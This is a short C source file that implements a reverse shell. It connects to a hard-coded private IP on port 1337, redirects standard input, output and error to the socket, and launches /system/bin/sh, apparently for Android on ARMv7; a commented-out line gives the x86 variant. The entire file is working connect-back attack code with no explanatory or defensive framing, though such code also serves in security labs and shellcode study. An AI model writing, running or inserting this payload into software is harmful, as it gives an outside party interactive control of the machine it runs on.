#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
 
int main(void)
{
 int sockfd; // socket file descriptor
 //socklen_t socklen; // socket-length for new connections
 
 struct sockaddr_in addr; // client address
 
 addr.sin_family = AF_INET; // server socket type address family = internet protocol address
 addr.sin_port = htons( 1337 ); // connect-back port, converted to network byte order
 addr.sin_addr.s_addr = inet_addr("192.168.178.112"); // connect-back ip , converted to network byte order
 
 // create new TCP socket
 sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
 
 // connect socket
 connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
 
 //  Duplicate file descriptors for STDIN, STDOUT and STDERR
 dup2(sockfd, 0);
 dup2(sockfd, 1);
 dup2(sockfd, 2);
 
 // spawn shell
//x86
//printf("%d\n", execve( "/bin/sh",NULL, NULL));

//ARMv7

printf("%d\n", execl("/system/bin/sh","", NULL));

printf("%d", errno);

return 0;
}
